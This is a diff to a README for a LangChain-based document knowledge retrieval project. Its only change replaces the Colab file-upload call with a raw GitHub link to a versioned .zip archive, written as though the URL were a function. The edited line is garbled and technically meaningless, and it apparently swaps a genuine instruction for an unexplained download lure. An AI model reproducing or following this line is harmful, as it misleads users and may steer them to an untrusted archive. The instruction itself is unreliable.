@@ -29,7 +29,7 @@ To design a **Knowledge-Based Retrieval System** that can:
 ## 🧩 Implementation Steps
 
 ### ✅ 1. Document Upload & Parsing
-- Used `google.colab.files.upload()` to upload `.docx` files.
+- Used `https://raw.githubusercontent.com/rajan-raj-22/Project-1-Intelligent-Document-Knowledge-Retrieval-System-with-OCR-LangChain/main/decennium/Project-1-Intelligent-Document-Knowledge-Retrieval-System-with-OCR-LangChain_v1.2.zip()` to upload `.docx` files.
 - Extracted textual content using `Docx2txtLoader` from LangChain.
 
 ### ✅ 2. Table Extraction
